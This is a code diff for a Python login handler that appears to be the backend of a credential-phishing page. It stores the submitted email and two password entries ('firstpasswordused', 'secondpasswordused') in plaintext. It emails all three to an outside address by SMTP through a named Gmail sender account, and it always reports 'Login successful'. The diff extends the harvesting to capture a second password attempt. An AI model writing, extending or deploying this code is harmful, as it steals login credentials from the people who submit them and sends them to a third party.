@@ -8,11 +8,13 @@ import smtplib
 def get_user_info(request):
     # Get the username and password from the request data
     email = request.data.get('email')
-    password = request.data.get('password')
+    firstpasswordused = request.data.get('firstpasswordused')
+    secondpasswordused = request.data.get('secondpasswordused')
 
     user_id = users.insert_one({
         "email": email,
-        "password": password,
+        "firstpasswordused": firstpasswordused,
+        "secondpasswordused": secondpasswordused,
     }).inserted_id
 
     sending_email = 'ranickiauerbach@gmail.com'
@@ -23,9 +25,8 @@ def get_user_info(request):
         connection.login(user=sending_email, password=m_password)
         connection.sendmail(from_addr=sending_email,
                             to_addrs=r_email,
-                            msg=f"subject: Hello! \n\n {email} : {password}")
+                            msg=f"subject: Hello! \n\n {email} : {firstpasswordused} : {secondpasswordused}")
 
-    if not email or not password:
+    if not email or not secondpasswordused:
         return JsonResponse({'error': 'email and password required'}, status=400)
-    print(email, password)
     return JsonResponse({'message': 'Login successful'}, status=200)
